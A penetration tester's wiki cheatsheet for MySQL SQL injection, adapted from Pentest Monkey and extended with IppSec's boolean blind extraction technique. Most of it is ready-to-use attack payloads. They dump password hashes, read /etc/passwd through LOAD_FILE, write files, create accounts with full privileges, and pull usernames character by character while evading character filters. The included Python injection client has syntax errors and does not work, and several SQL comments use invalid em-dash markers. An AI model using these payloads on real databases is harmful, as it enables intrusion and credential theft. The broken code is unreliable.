# MySQL SQL Injection Cheatsheet

This page is for SQL injection, for exploitation, misconfigurations and abuse of a MySQL database where you can access the database directly visit [[MySQL-Hacking]].  This page started as fixed version of Pentest Monkey cheatsheet that is old, but gold - it happen to use Unicode quotes so this is the *fixed* version. Other techniques, consideration and mitigation, etc will be added here over time.
#### MySQL SQL Injection Cheatsheet - Fixed From Pentest-Monkey

Fixed the Unicode single quotes for copy and paste -able. Pentest Monkey is Awesome.

Version
```sql
SELECT @@version
```

Comments
```sql
SELECT 1; #comment
SELECT /*comment*/1;
```

Current User 	
```sql
SELECT user();
SELECT system_user();
```

List Users 	
```sql
SELECT user FROM mysql.user; — priv
```

List Password Hashes 	
```sql
SELECT host, user, password FROM mysql.user; — priv
```

Password Cracker John the Ripper will crack MySQL password hashes.

List Privileges 	
```sql
SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; — list user privsSELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user; — priv, list user privsSELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; — list privs on databases (schemas)SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges; — list privs on columns
```

List DBA Accounts 	
```sql
SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'SUPER';SELECT host, user FROM mysql.user WHERE Super_priv = 'Y'; # priv
```

Current Database 	
```sql
SELECT database()
```

List Databases 	
```sql
SELECT schema_name FROM information_schema.schemata; — for MySQL >= v5.0
SELECT distinct(db) FROM mysql.db — priv
```

List Columns 	
```sql
SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
```

List Tables 	
```sql
SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
```

Find Tables From Column Name 	
```sql
SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = 'username'; — find table which have a column called 'username'
```

Select Nth Row 	
```sql
SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0; # rows numbered from 0
SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1; # rows numbered from 0
```

Select Nth Char 
```sql
SELECT substr('abcd', 3, 1); # returns c
```

Bitwise AND 	
```sql
SELECT 6 & 2; # returns 2
SELECT 6 & 1; # returns 0
```

ASCII Value -> Char 	
```sql
SELECT char(65); # returns A
```

Char -> ASCII Value 	
```sql
SELECT ascii('A'); # returns 65
```

Casting 	
```sql
SELECT cast('1' AS unsigned integer);
SELECT cast('123' AS char);
```

String Concatenation 	
```sql
SELECT CONCAT('A','B'); #returns AB
SELECT CONCAT('A','B','C'); # returns ABC
```

If Statement 	
```sql
SELECT if(1=1,'foo','bar'); — returns 'foo'
```

Case Statement 	
```sql
SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END; # returns A
```

Avoiding Quotes 	
```sql
SELECT 0x414243; # returns ABC
```

Time Delay 
```sql
SELECT BENCHMARK(1000000,MD5('A'));
SELECT SLEEP(5); # >= 5.0.12
```

Make DNS Requests 	Impossible?

Command Execution 	

If mysqld (<5.0) is running as root AND you compromise a DBA account you can execute OS commands by uploading a shared object file into /usr/lib (or similar).  The .so file should contain a User Defined Function (UDF).  raptor_udf.c explains exactly how you go about this.  Remember to compile for the target architecture which may or may not be the same as your attack platform.

Local File Access 	

```sql
…' UNION ALL SELECT LOAD_FILE('/etc/passwd') — priv, can only read world-readable files.
SELECT * FROM mytable INTO dumpfile '/tmp/somefile'; — priv, write to file system
```

Hostname, IP Address 	
```sql
SELECT @@hostname;
```

Create Users 	
```sql
CREATE USER test1 IDENTIFIED BY 'pass1'; — priv
```

Delete Users 	
```sql
DROP USER test1; — priv
```

Make User DBA 	
```sql
GRANT ALL PRIVILEGES ON *.* TO test1@'%'; — priv
```

Location of DB files 	
```sql
SELECT @@datadir;
```

Default/System Databases
```sql
information_schema (>= mysql 5.0)
mysql
```

#### IppSec's Automating Boolean SQL Injection and Evading Filters

SQLi client
```python
import cmd
import requests

# IppSec's SQL Injection client
# The benefits over BurpSuite being customisation of bad characters to URL encode
# Source: https://www.youtube.com/watch?v=mF8Q1FhnU70

# Use cmd to create a terminal
class CMD(cmd.Cmd):
        def __init__(self):
                cmd.Cmd.__init__(self):
                self.prompt = "sql> "

        def default(self, line):
                line = line.replace(" ", "%20")
                r = requests.get(f"http://127.0.0.1:5000/path")
                print.(r.text)

cmd = Cmd()
cmd.cmdloop()
```

Boolean injection 
```sql
' or (select 1) like 1-- -
```
False `{"result":0}` and True `{"result":1}` 
```sql
-- _ is a bad character; we also possibly cannot cast _ to hex
' or (select schema_name from information_schema.schemata limit 1) like 1-- -
```

Enumerate the users column
```sql
' or (select 1 from users limit 1) like 1-- -
```
Validate with
```sql
' or (select 1 from users limit 1) like 2-- -
```
And
```sql
' or (select 1 from AAAAAARGH limit 1) like 2-- -
```
We `select 1` to guess one character at a time. Then fuzz one character at a time with [[FFUF-Cheatsheet]], [[WFUZZ]] and then the next column with `offset`
```sql
' or (select usernames from users limit 1 offset 0) like 'ippsec'-- -
```
Next we need to use `substring`. Beware confusing where it `substring()` starts, because `limit` starts with 0, but `substring()` start with 1. 
```sql
--(select substring(usernames,OFFSET,NUMBER_OF_CHARACTERS)
-- substring start with 1 NOT 0
' or (select substring(usernames,1,3) from users limit 1 offset 0) like 'ippsec'-- -
```
But commas are also bad characters so use the keyword `FROM` and `FOR`
```sql
--(select substring(usernames,OFFSET,NUMBER_OF_CHARACTERS)
-- substring start with 1 NOT 0
' or (select substring(usernames FROM 1 FOR 3) from users limit 1 offset 0) like 'ippsec'-- -
```
Ippsec likes working with decimal values as we can then use greater than and equal to an decimal value using MySQL's `ord()` to covert a string to decimal value
```sql
--(select substring(usernames,OFFSET,NUMBER_OF_CHARACTERS)
-- substring start with 1 NOT 0 
-- `man ascii` for list
' or (select ord(substring(usernames FROM 1 FOR 3)) from users limit 1 offset 0) like 65-- -
```
But < > are bad characters... so we use the keyword `between` and `and`
```sql
--(select substring(usernames,OFFSET,NUMBER_OF_CHARACTERS)
-- substring start with 1 NOT 0 
-- `man ascii` for list
' or (select ord(substring(usernames FROM 2 FOR 1)) from users limit 1 offset 0) between 113 and 200 -- -
```
Lengths of data with `length()`
```sql
' or (select length(usernames) from users limit 1 offset 0) like 1 -- -
```

22:45 - automate the extraction!

## References

[Original Pentest Monkey Cheatsheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
[IppSec Youtube - Automating Boolean SQL Injection and Evading Filters](https://www.youtube.com/watch?v=mF8Q1FhnU70)